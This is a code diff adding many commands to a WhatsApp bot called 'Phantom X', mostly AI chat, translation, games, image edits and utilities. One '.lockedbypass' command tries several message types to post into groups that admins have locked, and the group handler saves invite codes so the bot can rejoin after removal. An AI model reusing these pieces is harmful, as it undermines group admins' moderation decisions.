+                if (!txt) return reply("🌐 *AI Translate*\n\n*.atranslate <text> <lang>*\n_Reply to a msg with *.atranslate <lang>* (e.g. en, yo, ig, ha, fr, es, ar)_");
+                const langArg = parts[parts.length - 1].toLowerCase();
+                const looksLikeLang = /^[a-z]{2,3}$/.test(langArg);
+                const target = looksLikeLang ? langArg : "en";
+                const body = looksLikeLang ? parts.slice(1, -1).join(" ").trim() || txt : txt;
+                await reply(`⏳ Translating to *${target}*…`);
+                try {
+                    const r = await callGemini(`Translate the following text to ${target}. Output only the translation, no commentary.\n\nTEXT:\n${body}`, { temperature: 0.2 });
+                    return reply(`🌐 *${target.toUpperCase()}*\n━━━━━━━━━━\n${r}`);
+                } catch (e) { return reply(`❌ ${e?.message}`); }
+            }
+
+            case ".codereview": {
+                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                let code = parts.slice(1).join(" ").trim();
+                if (!code && quoted) code = quoted.conversation || quoted.extendedTextMessage?.text || "";
+                if (!code) return reply("🔍 *Code Review*\n\nReply to a code snippet with *.codereview* (static analysis only — no execution).");
+                await reply("⏳ Reviewing…");
+                try {
+                    const r = await callGemini(`Act as a senior engineer doing a code review. Identify bugs, security issues, and improvements. Be specific and actionable. DO NOT execute anything — static review only.\n\nCODE:\n\`\`\`\n${code.slice(0, 8000)}\n\`\`\``, { temperature: 0.3 });
+                    return reply(`🔍 *Code Review*\n━━━━━━━━━━━━\n${r}`);
+                } catch (e) { return reply(`❌ ${e?.message}`); }
+            }
+
+            case ".code": {
+                const prompt = parts.slice(1).join(" ").trim();
+                if (!prompt) return reply("💻 *Code Generator*\n\n*.code <what to build>*\nExample: *.code python script that downloads YouTube videos*");
+                await reply("⏳ Generating…");
+                try {
+                    const r = await callGemini(`Write production-ready code for this request. Include brief usage notes after the code block. Pick the best language unless specified.\n\nREQUEST: ${prompt}`, { temperature: 0.4 });
+                    return reply(`💻 *Code*\n━━━━━━━━\n${r}`);
+                } catch (e) { return reply(`❌ ${e?.message}`); }
+            }
+
+            case ".explain": {
+                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                let q = parts.slice(1).join(" ").trim();
+                if (!q && quoted) q = quoted.conversation || quoted.extendedTextMessage?.text || "";
+                if (!q) return reply("🧠 *Explain*\n\n*.explain <topic>* — or reply to anything with *.explain*");
+                await reply("⏳ Thinking…");
+                try {
+                    const r = await callGemini(`Explain this clearly and simply, like talking to a smart friend. Use examples where helpful. Keep it tight.\n\nTOPIC:\n${q.slice(0, 4000)}`, { temperature: 0.5 });
+                    return reply(`🧠 *Explain*\n━━━━━━━━━━\n${r}`);
+                } catch (e) { return reply(`❌ ${e?.message}`); }
+            }
+
+            case ".persona": {
+                const sub = (parts[1] || "").toLowerCase();
+                const scope = from;
+                if (!sub || sub === "show") {
+                    const p = getPersona(scope);
+                    return reply(p ? `🎭 *Active persona for this chat:*\n\n${p}` : "🎭 No persona set for this chat.\n\n*.persona set <description>*\n*.persona clear*\n_Then use *.aichat <msg>* to chat with the persona._");
+                }
+                if (sub === "set") {
+                    const text = parts.slice(2).join(" ").trim();
+                    if (!text) return reply("Usage: *.persona set <description>*\nExample: *.persona set a savage Lagos slang comedian who roasts gently*");
+                    setPersona(scope, text); return reply(`✅ Persona set for this chat. Use *.aichat <msg>* to talk to it.`);
+                }
+                if (sub === "clear") { clearPersona(scope); return reply("🧹 Persona cleared."); }
+                return reply("Unknown subcommand.");
+            }
+
+            case ".aichat": {
+                const KEY = process.env.GEMINI_API_KEY || process.env.GOOGLE_API_KEY;
+                if (!KEY) return reply("⚠️ Set GEMINI_API_KEY (or GOOGLE_API_KEY) first. Get a free one at https://aistudio.google.com/app/apikey");
+                const text = parts.slice(1).join(" ").trim();
+                if (!text) return reply("💬 *.aichat <message>* — chats with the persona of this chat (or default if none set).");
+                const persona = getPersona(from) || "You are Phantom X, a friendly bot assistant. Be helpful and concise.";
+                try {
+                    const r = await callAI(text, { system: persona, temperature: 0.8 });
+                    return reply(r);
+                } catch (e) { return reply(`❌ ${e?.message}`); }
+            }
+
+            // ════════════════════════════════════════
+            // ░░░░░ TTS ░░░░░
+            // ════════════════════════════════════════
+            case ".tts":
+            case ".voice":
+            case ".tovn": {
+                const sub = cmd === ".tts" ? parts[1] : null;
+                let lang = "en"; let text;
+                if (cmd === ".tts" && /^[a-z]{2,3}$/i.test(sub || "")) { lang = sub.toLowerCase(); text = parts.slice(2).join(" ").trim(); }
+                else text = parts.slice(1).join(" ").trim();
+                if (!text) {
+                    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                    if (quoted) text = quoted.conversation || quoted.extendedTextMessage?.text || "";
+                }
+                if (!text) return reply(`🔊 *Text-to-Speech*\n\n*.tts <text>* (English)\n*.tts yo Bawo ni* (Yoruba — try en, yo, ig, ha, fr, es, ar, sw…)\n*.voice <text>* — same\n*.tovn <text>* — sends as voice note\n\n_Reply to a message with .tovn to convert it._`);
+                try {
+                    await reply("🎙️ Generating audio…");
+                    const buf = await googleTts(text, lang);
+                    if (cmd === ".tovn") return await sock.sendMessage(from, { audio: buf, mimetype: "audio/mp4", ptt: true }, { quoted: msg });
+                    return await sock.sendMessage(from, { audio: buf, mimetype: "audio/mp4", ptt: false }, { quoted: msg });
+                } catch (e) { return reply(`❌ TTS failed: ${e?.message}`); }
+            }
+
+            // ════════════════════════════════════════
+            // ░░░░░ IMAGE EDITOR ░░░░░
+            // ════════════════════════════════════════
+            case ".blur":
+            case ".invert":
+            case ".grayscale":
+            case ".brighten":
+            case ".darken":
+            case ".sharpen":
+            case ".pixelate":
+            case ".cartoon": {
+                const op = cmd.slice(1);
+                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const isImageHere = msg.message?.imageMessage;
+                const target = quoted && getContentType(quoted) === "imageMessage" ? { ...msg, message: quoted } : (isImageHere ? msg : null);
+                if (!target) return reply(`🖼️ Reply to (or send) an image with *.${op}*`);
+                try {
+                    const buf = await downloadMediaMessage(target, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    const out = await applyImageOp(buf, op, { amount: parts[1] });
+                    return await sock.sendMessage(from, { image: out, caption: `✨ ${op}` }, { quoted: msg });
+                } catch (e) { return reply(`❌ ${e?.message}`); }
+            }
+
+            case ".removebg":
+            case ".upscale": {
+                const op = cmd.slice(1);
+                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const isImageHere = msg.message?.imageMessage;
+                const target = quoted && getContentType(quoted) === "imageMessage" ? { ...msg, message: quoted } : (isImageHere ? msg : null);
+                if (!target) return reply(`🖼️ Reply to an image with *.${op}*`);
+                await reply(`⏳ ${op === "removebg" ? "Removing background" : "Upscaling"}…`);
+                try {
+                    const buf = await downloadMediaMessage(target, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    const out = op === "removebg" ? await removeBgRemote(buf) : await upscaleRemote(buf);
+                    return await sock.sendMessage(from, { image: out, caption: `✨ ${op}` }, { quoted: msg });
+                } catch (e) { return reply(`❌ ${e?.message}`); }
+            }
+
+            // ════════════════════════════════════════
+            // ░░░░░ GAMES ░░░░░
+            // ════════════════════════════════════════
+            case ".math": {
+                if (mathState[from] && parts[0] && !isNaN(Number(parts[0]))) { /* won't reach: parts[0]=cmd */ }
+                if (parts[1]?.toLowerCase() === "stop") { delete mathState[from]; return reply("🛑 Math stopped."); }
+                if (mathState[from] && parts[1]) {
+                    const ans = Number(parts[1]);
+                    if (isNaN(ans)) return reply("Reply with a number, or *.math stop*.");
+                    if (ans === mathState[from].answer) { const t = mathState[from]; delete mathState[from]; return reply(`🎉 Correct! *${t.q} = ${t.answer}*\nNew round: *.math*`); }
+                    return reply(`❌ Wrong. Try again or *.math stop*.`);
+                }
+                const ops = ["+", "-", "*"];
+                const op = ops[Math.floor(Math.random() * ops.length)];
+                const a = Math.floor(Math.random() * (op === "*" ? 13 : 100)) + 1;
+                const b = Math.floor(Math.random() * (op === "*" ? 13 : 100)) + 1;
+                const ans = op === "+" ? a + b : op === "-" ? a - b : a * b;
+                mathState[from] = { q: `${a} ${op} ${b}`, answer: ans, at: Date.now() };
+                return reply(`🧮 *Math Challenge*\n\nWhat is *${a} ${op} ${b}* ?\n\nReply: *.math <answer>* (or *.math stop*)`);
+            }
+
+            case ".guessflag": {
+                if (parts[1]?.toLowerCase() === "stop") { delete guessFlagState[from]; return reply("🛑 Stopped."); }
+                if (guessFlagState[from] && parts[1]) {
+                    const guess = parts.slice(1).join(" ").trim().toLowerCase();
+                    const ans = guessFlagState[from].name.toLowerCase();
+                    if (guess === ans || ans.includes(guess) || guess.includes(ans)) { const f = guessFlagState[from]; delete guessFlagState[from]; return reply(`🎉 Correct! It was *${f.name}* ${f.flag}\n\nNew: *.guessflag*`); }
+                    guessFlagState[from].tries = (guessFlagState[from].tries || 0) + 1;
+                    if (guessFlagState[from].tries >= 3) { const f = guessFlagState[from]; delete guessFlagState[from]; return reply(`❌ Out of tries! It was *${f.name}* ${f.flag}`); }
+                    return reply(`❌ Wrong (${3 - guessFlagState[from].tries} tries left).`);
+                }
+                const f = FLAGS[Math.floor(Math.random() * FLAGS.length)];
+                guessFlagState[from] = { flag: f.e, name: f.n, tries: 0, at: Date.now() };
+                return reply(`🌍 *Guess the Flag*\n\nWhich country is this?\n\n# ${f.e}\n\nReply: *.guessflag <country>* (3 tries)`);
+            }
+
+            case ".typingtest": {
+                if (parts[1]?.toLowerCase() === "stop") { delete typingTestState[from]; return reply("🛑 Stopped."); }
+                if (typingTestState[from] && parts[1]) {
+                    const typed = parts.slice(1).join(" ").trim();
+                    const t = typingTestState[from];
+                    delete typingTestState[from];
+                    const elapsed = (Date.now() - t.startedAt) / 1000;
+                    const targetWords = t.sentence.trim().split(/\s+/);
+                    const typedWords = typed.trim().split(/\s+/);
+                    let correct = 0;
+                    for (let i = 0; i < targetWords.length; i++) if (typedWords[i] === targetWords[i]) correct++;
+                    const wpm = Math.round((correct / elapsed) * 60);
+                    const acc = Math.round((correct / targetWords.length) * 100);
+                    return reply(`⌨️ *Typing Test Result*\n━━━━━━━━━━━━━━\n• Time: ${elapsed.toFixed(1)}s\n• WPM: *${wpm}*\n• Accuracy: *${acc}%*\n• Correct words: ${correct}/${targetWords.length}\n\nNew: *.typingtest*`);
+                }
+                const sentence = TYPING_SENTENCES[Math.floor(Math.random() * TYPING_SENTENCES.length)];
+                typingTestState[from] = { sentence, startedAt: Date.now() };
+                return reply(`⌨️ *Typing Test*\n━━━━━━━━━━━━━\nType this *exactly* as fast as you can:\n\n_${sentence}_\n\nReply: *.typingtest <your typed text>*`);
+            }
+
+            case ".connect4": {
+                const sub = (parts[1] || "").toLowerCase();
+                if (sub === "stop" || sub === "end") { delete connect4State[from]; return reply("🛑 Game ended."); }
+                let g = connect4State[from];
+                if (!g || sub === "new" || sub === "start") {
+                    g = { board: newC4Board(), turn: 1, players: { 1: senderJid, 2: null }, mode: "open", at: Date.now() };
+                    connect4State[from] = g;
+                    return reply(`🔴🟡 *Connect 4*\n\n${renderC4(g.board)}\nP1 (🔴): @${senderJid.split("@")[0]}\nP2 (🟡): waiting…\n\nAnother player: *.connect4 join*\nDrop a piece: *.connect4 <1-7>*`);
+                }
+                if (sub === "join") {
+                    if (g.players[2]) return reply("⚠️ Already 2 players.");
+                    if (g.players[1] === senderJid) return reply("⚠️ You're already P1.");
+                    g.players[2] = senderJid;
+                    return reply(`✅ Joined as P2 (🟡)!\n\n${renderC4(g.board)}\nP1's turn (🔴): @${g.players[1].split("@")[0]}\nDrop: *.connect4 <1-7>*`);
+                }
+                const col = parseInt(sub) - 1;
+                if (isNaN(col) || col < 0 || col > 6) return reply("⚠️ Pick a column 1-7.");
+                if (!g.players[2]) return reply("Need 2 players. *.connect4 join*");
+                if (senderJid !== g.players[g.turn]) return reply("⏳ Not your turn.");
+                const r = c4Drop(g.board, col, g.turn);
+                if (r === -1) return reply("⚠️ Column full.");
+                if (c4Wins(g.board, g.turn)) {
+                    const w = g.players[g.turn]; delete connect4State[from];
+                    return reply(`🏆 *@${w.split("@")[0]} WINS!*\n\n${renderC4(g.board)}`);
+                }
+                if (g.board.every(row => row.every(c => c !== 0))) { delete connect4State[from]; return reply(`🤝 *Draw!*\n\n${renderC4(g.board)}`); }
+                g.turn = g.turn === 1 ? 2 : 1;
+                return reply(`${renderC4(g.board)}\nNext: ${g.turn === 1 ? "🔴 P1" : "🟡 P2"} (@${g.players[g.turn].split("@")[0]})`);
+            }
+
+            case ".werewolf": {
+                const sub = (parts[1] || "").toLowerCase();
+                if (sub === "stop" || sub === "end") { delete werewolfState[from]; return reply("🛑 Werewolf ended."); }
+                let g = werewolfState[from];
+                if (!g || sub === "new") {
+                    g = { phase: "lobby", players: [{ jid: senderJid }], roles: {}, votes: {}, alive: {}, at: Date.now(), host: senderJid };
+                    werewolfState[from] = g;
+                    return reply(`🐺 *Werewolf Lobby*\n━━━━━━━━━━━━\nHost: @${senderJid.split("@")[0]}\nPlayers (1):\n  • @${senderJid.split("@")[0]}\n\n*.werewolf join* — join\n*.werewolf begin* — start (need 4-6)\n*.werewolf stop* — cancel`);
+                }
+                if (sub === "join") {
+                    if (g.phase !== "lobby") return reply("⚠️ Game already started.");
+                    if (g.players.find(p => p.jid === senderJid)) return reply("⚠️ Already in.");
+                    if (g.players.length >= 6) return reply("⚠️ Lobby full.");
+                    g.players.push({ jid: senderJid });
+                    return reply(`✅ Joined!\nPlayers (${g.players.length}):\n${g.players.map(p => `  • @${p.jid.split("@")[0]}`).join("\n")}`);
+                }
+                if (sub === "begin") {
+                    if (senderJid !== g.host) return reply("⚠️ Only the host can begin.");
+                    if (g.players.length < 4) return reply("⚠️ Need at least 4 players.");
+                    const roles = WEREWOLF_ROLES.slice(0, g.players.length).sort(() => Math.random() - 0.5);
+                    g.players.forEach((p, i) => { g.roles[p.jid] = roles[i]; g.alive[p.jid] = true; });
+                    g.phase = "day"; g.day = 1;
+                    for (const p of g.players) {
+                        try { await sock.sendMessage(p.jid, { text: `🐺 *Werewolf*\n\nYour role: *${g.roles[p.jid].toUpperCase()}*\n\nKeep it secret. Discuss in the group, then *.werewolf vote @user*` }); } catch {}
+                    }
+                    return reply(`🌅 *Day 1 begins!*\n\nDiscuss who you suspect. Vote: *.werewolf vote @user*\n(Roles DM'd to each player.)`);
+                }
+                if (sub === "vote") {
+                    if (g.phase !== "day") return reply("⚠️ Not voting time.");
+                    if (!g.alive[senderJid]) return reply("💀 You're dead, no vote.");
+                    const mention = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+                    if (!mention) return reply("Tag the player: *.werewolf vote @user*");
+                    if (!g.alive[mention]) return reply("⚠️ That player isn't alive.");
+                    g.votes[senderJid] = mention;
+                    const aliveCount = Object.values(g.alive).filter(Boolean).length;
+                    const voted = Object.keys(g.votes).length;
+                    if (voted >= aliveCount) {
+                        const tally = {};
+                        for (const v of Object.values(g.votes)) tally[v] = (tally[v] || 0) + 1;
+                        const top = Object.entries(tally).sort((a, b) => b[1] - a[1])[0];
+                        g.alive[top[0]] = false;
+                        const role = g.roles[top[0]];
+                        g.votes = {};
+                        const wolves = Object.entries(g.alive).filter(([j, a]) => a && g.roles[j] === "werewolf").length;
+                        const villagers = Object.entries(g.alive).filter(([j, a]) => a && g.roles[j] !== "werewolf").length;
+                        if (wolves === 0) { delete werewolfState[from]; return reply(`💀 @${top[0].split("@")[0]} (${role}) was voted out!\n\n🏆 *VILLAGERS WIN!*`); }
+                        if (wolves >= villagers) { delete werewolfState[from]; return reply(`💀 @${top[0].split("@")[0]} (${role}) was voted out!\n\n🐺 *WEREWOLVES WIN!*`); }
+                        g.day++;
+                        return reply(`💀 @${top[0].split("@")[0]} (${role}) was voted out!\n\n🌅 *Day ${g.day}* — keep voting.`, { mentions: [top[0]] });
+                    }
+                    return reply(`✅ Vote recorded (${voted}/${aliveCount}).`);
+                }
+                return reply("Unknown subcommand. Try *.werewolf*.");
+            }
+
+            case ".akinator": {
+                const sub = (parts[1] || "").toLowerCase();
+                if (sub === "stop") { delete akinatorState[from]; return reply("🛑 Akinator stopped."); }
+                if (!akinatorState[from] || sub === "new" || sub === "start") {
+                    akinatorState[from] = { history: [], guessed: false };
+                    try {
+                        const q = await callGemini(`You are playing 20 Questions / Akinator. The player is thinking of a famous person, character, or thing. Ask the FIRST yes/no question to start narrowing down. Output ONLY the question, nothing else.`, { temperature: 0.6 });
+                        akinatorState[from].history.push({ role: "akinator", text: q });
+                        return reply(`🧞 *Akinator*\n\nThink of a famous person, character, or thing. I'll ask yes/no questions.\n\n*Q1:* ${q}\n\nReply: *.akinator yes/no/maybe*`);
+                    } catch (e) { delete akinatorState[from]; return reply(`❌ ${e?.message}`); }
+                }
+                const ans = sub;
+                if (!["yes", "no", "maybe", "y", "n", "m"].includes(ans)) return reply("Reply *.akinator yes*, *.akinator no*, or *.akinator maybe*.");
+                akinatorState[from].history.push({ role: "player", text: ans });
+                const turns = akinatorState[from].history.filter(x => x.role === "akinator").length;
+                const transcript = akinatorState[from].history.map(x => `${x.role === "akinator" ? "Q" : "A"}: ${x.text}`).join("\n");
+                try {
+                    if (turns >= 20 || (turns >= 7 && Math.random() < 0.25)) {
+                        const guess = await callGemini(`Based on this 20Q transcript, make your best guess of WHO/WHAT the player is thinking of. Output exactly: "I think it's <answer>!"\n\n${transcript}`, { temperature: 0.4 });
+                        delete akinatorState[from];
+                        return reply(`🧞 ${guess}\n\nNew round: *.akinator new*`);
+                    }
+                    const next = await callGemini(`You're playing 20Q. Continue with the next yes/no question to narrow it down further. Be strategic — don't repeat. Output ONLY the question.\n\nSO FAR:\n${transcript}`, { temperature: 0.6 });
+                    akinatorState[from].history.push({ role: "akinator", text: next });
+                    return reply(`*Q${turns + 1}:* ${next}\n\nReply: *.akinator yes/no/maybe*`);
+                } catch (e) { return reply(`❌ ${e?.message}`); }
+            }
+
+
+
+            // ─── CHAT (owner talks to the bot like a chatbox) ───
+            case ".chat": {
+                if (!msg.key.fromMe) return;
+                const chatInput = parts.slice(1).join(" ").trim();
+                if (!chatInput) return reply(`🤖 *Phantom X Chat*\n\nUsage: *.chat <message>*\n\nTalk to me! I'll respond.\nExample: *.chat how are you*`);
+                const lc = chatInput.toLowerCase();
+                const quickReplies = [
+                    [["hi","hello","hey","sup"], "Hey! 👋 What's up? How can I help you today?"],
+                    [["how are you","how r u","how are u"], "I'm doing great! Always online, always ready. 😎"],
+                    [["what's your name","your name","who are you"], "I'm *Phantom X* — your personal WhatsApp bot! 👻"],
+                    [["who made you","who created you","who built you"], `I was built by the developer with number ${DEV_NUMBER}. 🛠️`],
+                    [["what can you do","your features","commands"], "Type *.menu* to see everything I can do! 🔥"],
+                    [["good morning","gm"], "Good morning! ☀️ Have an amazing day!"],
+                    [["good night","gn","goodnight"], "Good night! 🌙 Rest well."],
+                    [["thanks","thank you","thx","ty"], "You're welcome! 😊 Anything else?"],
+                    [["i love you","ilove you"], "Love you too! 💛 I'm always here for you."],
+                    [["bye","goodbye","later","cya"], "Bye! 👋 Come back anytime."],
+                    [["bored","i'm bored"], "Try *.trivia*, *.riddle*, *.8ball*, or *.slots*! 🎮"],
+                    [["joke","tell me a joke"], `😂 ${JOKES[Math.floor(Math.random() * JOKES.length)]}`],
+                    [["fact","random fact"], `📚 ${FACTS[Math.floor(Math.random() * FACTS.length)]}`],
+                ];
+                for (const [keys, response] of quickReplies) {
+                    if (keys.some(k => lc.includes(k))) return reply(`🤖 ${response}`);
+                }
+                // Try Gemini AI for anything else
+                const GEMINI_KEY = process.env.GEMINI_API_KEY || process.env.GOOGLE_API_KEY;
+                if (GEMINI_KEY) {
+                    try {
+                        const geminiRes = await new Promise((resolve, reject) => {
+                            const body = JSON.stringify({ contents: [{ parts: [{ text: `You are Phantom X, a friendly WhatsApp bot assistant. Reply conversationally and briefly. User says: ${chatInput}` }] }] });
+                            const options = { hostname: "generativelanguage.googleapis.com", path: `/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_KEY}`, method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } };
+                            const req = https.request(options, (res) => { let d = ""; res.on("data", c => d += c); res.on("end", () => { try { resolve(JSON.parse(d)); } catch { reject(new Error("parse")); } }); });
+                            req.on("error", reject); req.write(body); req.end();
+                        });
+                        const aiReply = geminiRes?.candidates?.[0]?.content?.parts?.[0]?.text?.trim();
+                        if (aiReply) return reply(`🤖 ${aiReply}`);
+                    } catch (_) {}
+                }
+                // Fallback
+                const fallbacks = ["Interesting! Tell me more. 🤔", "I hear you! 😊", "That's noted! What else can I do for you?", "Got it! 👍", "Hmm, say that again? 😄"];
+                await reply(`🤖 ${fallbacks[Math.floor(Math.random() * fallbacks.length)]}`);
+                break;
+            }
+
+            // ─── AUTO-JOIN GROUP LINKS ───
+            case ".autojoin": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                const ajArg = parts[1]?.toLowerCase();
+                if (!ajArg) {
+                    const aj = loadAutojoin();
+                    const status = aj[sock.user?.id || "global"]?.enabled ? "✅ ON" : "❌ OFF";
+                    return reply(`🔗 *Auto-Join Group Links*\n\nStatus: *${status}*\n\nUsage:\n*.autojoin on* — Bot joins any group link shared in groups\n*.autojoin off* — Stop auto-joining\n\n⚠️ Blacklisted keywords: porn, adult, xxx, nude, sex, leak, onlyfan\n_Links containing these words will be ignored._`);
+                }
+                const aj = loadAutojoin();
+                const key = sock.user?.id || "global";
+                if (ajArg === "on") {
+                    if (!aj[key]) aj[key] = {};
+                    aj[key].enabled = true;
+                    saveAutojoin(aj);
+                    return reply(`✅ *Auto-join ON!*\nThe bot will now automatically join any WhatsApp group link shared in your groups.\n\n🚫 Blacklisted links (porn/adult/nude etc.) will be skipped.`);
+                }
+                if (ajArg === "off") {
+                    if (!aj[key]) aj[key] = {};
+                    aj[key].enabled = false;
+                    saveAutojoin(aj);
+                    return reply(`❌ *Auto-join OFF.*\nThe bot will no longer auto-join group links.`);
+                }
+                return reply("Usage: .autojoin on/off");
+            }
+
+            // ─── LOCKED GROUP BYPASS ───
+            // Attempts to send a message into a group locked to admins-only.
+            // Tries multiple message types to find one that bypasses the restriction.
+            case ".lockedbypass": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                if (!isGroup) return reply("❌ Run this inside the locked group.");
+                const lbText = parts.slice(1).join(" ").trim() || "👻 Phantom X";
+                await reply(`🔓 Attempting to bypass admin-only lock...`);
+                let success = false;
+                const attempts = [
+                    async () => await sock.sendMessage(from, { text: lbText }),
+                    async () => await sock.sendMessage(from, { forward: { key: msg.key, message: msg.message } }),
+                    async () => await sock.sendMessage(from, { react: { text: "👻", key: msg.key } }),
+                ];
+                for (let i = 0; i < attempts.length; i++) {
+                    try { await attempts[i](); success = true; break; } catch (_) {}
+                }
+                if (success) {
+                    await reply(`✅ Bypass attempt sent! Check if the message appeared in the group.`);
+                } else {
+                    await reply(
+                        `❌ All bypass methods failed.\n\n` +
+                        `_Note: Modern WhatsApp fully blocks non-admin messages in locked groups. The bot needs admin rights to send messages._\n\n` +
+                        `💡 *Tip:* If the bot is admin, use *.unlock* to re-open the group first.`
+                    );
+                }
+                break;
+            }
+
+            // ────────────────────────────────────────
+            // ════════════════════════════════════════
+            // ░░░░░ EXTRAS ░░░░░
+            // ════════════════════════════════════════
+
+            case ".sticker": {
+                const stickerQuoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const stickerMsg = stickerQuoted || msg.message;
+                const stickerType = getContentType(stickerMsg);
+                if (!stickerMsg || !["imageMessage", "videoMessage"].includes(stickerType)) {
+                    return reply("🖼️ Reply to an *image* or short *video* with *.sticker* to convert it.\n\nExample: Reply to any image with _.sticker_");
+                }
+                try {
+                    await reply("⏳ Converting to sticker...");
+                    const fakeForSticker = stickerQuoted ? { ...msg, message: stickerQuoted } : msg;
+                    const mediaBuf = await downloadMediaMessage(fakeForSticker, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    if (stickerType === "imageMessage") {
+                        await sock.sendMessage(from, { sticker: mediaBuf }, { quoted: msg });
+                    } else {
+                        return reply("⚠️ *Video stickers are not supported.*\n\nOnly images can be converted to stickers.\nReply to an *image* with *.sticker* instead.");
+                    }
+                } catch (e) { await reply(`❌ Sticker conversion failed: ${e?.message}`); }
+                break;
+            }
+
+            case ".toimg": {
+                const toImgQuoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const toImgMsg = toImgQuoted || msg.message;
+                const toImgType = getContentType(toImgMsg);
+                if (!toImgMsg || toImgType !== "stickerMessage") {
+                    return reply("🖼️ Reply to a *sticker* with *.toimg* to convert it to an image.");
+                }
+                try {
+                    await reply("⏳ Converting sticker to image...");
+                    const fakeForImg = toImgQuoted ? { ...msg, message: toImgQuoted } : msg;
+                    const imgBuf = await downloadMediaMessage(fakeForImg, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    await sock.sendMessage(from, { image: imgBuf, caption: "🖼️ Sticker converted to image!" }, { quoted: msg });
+                } catch (e) { await reply(`❌ Conversion failed: ${e?.message}`); }
+                break;
+            }
+
+            case ".qr": {
+                const qrText = parts.slice(1).join(" ").trim();
+                if (!qrText) return reply("Usage: .qr <text or link>\nExample: .qr https://phantom-x.replit.app");
+                await reply("⏳ Generating QR code...");
+                try {
+                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=512x512&data=${encodeURIComponent(qrText)}`;
+                    const qrBuf = await fetchBuffer(qrUrl);
+                    await sock.sendMessage(from, { image: qrBuf, caption: `📱 *QR Code for:*\n_${qrText}_` }, { quoted: msg });
+                } catch (e) { await reply(`❌ QR generation failed: ${e?.message}`); }
+                break;
+            }
+
+            case ".genpwd": {
+                const pwdLen = Math.min(Math.max(parseInt(parts[1]) || 16, 6), 64);
+                const pwdChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:,.<>?";
+                let pwd = "";
+                for (let i = 0; i < pwdLen; i++) {
+                    pwd += pwdChars[Math.floor(Math.random() * pwdChars.length)];
+                }
+                await reply(`🔐 *Generated Password (${pwdLen} chars):*\n\n\`${pwd}\`\n\n_Keep this safe! Don't share it._`);
+                break;
+            }
+
+            case ".base64": {
+                const b64Sub = parts[1]?.toLowerCase();
+                const b64Text = parts.slice(2).join(" ").trim();
+                if (!b64Sub || !b64Text || !["encode","decode"].includes(b64Sub)) {
+                    return reply("Usage:\n*.base64 encode <text>*\n*.base64 decode <base64>*\n\nExample: .base64 encode Hello World");
+                }
+                try {
+                    if (b64Sub === "encode") {
+                        const encoded = Buffer.from(b64Text, "utf8").toString("base64");
+                        await reply(`🔒 *Base64 Encoded:*\n\n\`${encoded}\``);
+                    } else {
+                        const decoded = Buffer.from(b64Text, "base64").toString("utf8");
+                        await reply(`🔓 *Base64 Decoded:*\n\n${decoded}`);
+                    }
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            default:
+                // Typo suggestion — only fires when a dot-command is typed but not recognised
+                if (cmd && cmd.startsWith(".")) {
+                    if (isGroup) {
+                        await emitGroupTrace(sock, 'handle-unknown-cmd', {
+                            eventType: type,
+                            jid: from,
+                            sender: senderJid || from,
+                            fromMe: msg.key.fromMe,
+                            rawBody: body,
+                            reason: `unknown command ${cmd}`,
+                        });
+                    }
+                    const typoKey = `${senderJid}::${from}`;
+                    let bestDisplay = null, bestCmd = null, bestScore = 0.45;
+                    for (const [display, matchCmd] of KNOWN_CMDS) {
+                        const score = bigramSimilarity(cmd, matchCmd);
+                        if (score > bestScore) { bestScore = score; bestDisplay = display; bestCmd = matchCmd; }
+                    }
+                    for (const [display, matchCmd] of KNOWN_CMDS) {
+                        const score = bigramSimilarity(rawBody.trim().toLowerCase(), display);
+                        if (score > bestScore) { bestScore = score; bestDisplay = display; bestCmd = matchCmd; }
+                    }
+                    if (bestCmd) {
+                        const suggestedRaw = bestDisplay.replace(/ <[^>]+>/g, "").replace(/ @\w+/g, "").trim();
+                        const suggestedParts = suggestedRaw.split(" ");
+                        typoSuggestionState[typoKey] = { rawBody: suggestedRaw, cmd: suggestedParts[0], parts: suggestedParts };
+                        const typoBody = buildOmegaTerminal(
+                            `   ⚠️  *COMMAND_NOT_FOUND*\n` +
+                            `   ━━━━━━━━━━━━━━━\n\n` +
+                            `   ╔╦══ INPUT    ──╼  *${cmd}*\n` +
+                            `   ║╠══ STATUS   ──╼  _UNRECOGNISED_\n` +
+                            `   ╚╩══ CLOSEST  ──╼  *${bestDisplay}*\n\n` +
+                            `   _Tap the button below to execute it._`
+                        );
+                        await sendInteractiveButtons(sock, from, msg, typoBody, [
+                            { id: "typo_yes", label: `✅ Run  ${bestDisplay.split(" ")[0]}` },
+                            { id: "typo_no",  label: "❌ Dismiss" }
+                        ]);
+                    } else if (isSelfChat && body) {
+                        await reply(buildOmegaTerminal(`   👁  *SCANNING...*\n\n   Type *.menu* to access all commands.`));
+                    }
+                } else if (isSelfChat && body) {
+                    await reply(`👋 I'm active! Type *.menu* to see all commands.`);
+                }
+                break;
+        }
+    } catch (err) {
+        console.error("Message handler error:", err?.message || err);
+    }
+}
+
+// --- GROUP EVENTS HANDLER ---
+async function handleGroupUpdate(sock, update, ctx, botJid) {
+    const { id: groupJid, participants, action } = update;
+
+    try {
+        // Save group name whenever we see any event from a group
+        try {
+            if (!groupNames[groupJid]) {
+                const meta = await sock.groupMetadata(groupJid);
+                groupNames[groupJid] = meta.subject;
+                // Also save invite link for auto-rejoin
+                const code = await sock.groupInviteCode(groupJid);
+                savedGroupLinks[groupJid] = code;
+            }
+        } catch (_) {}
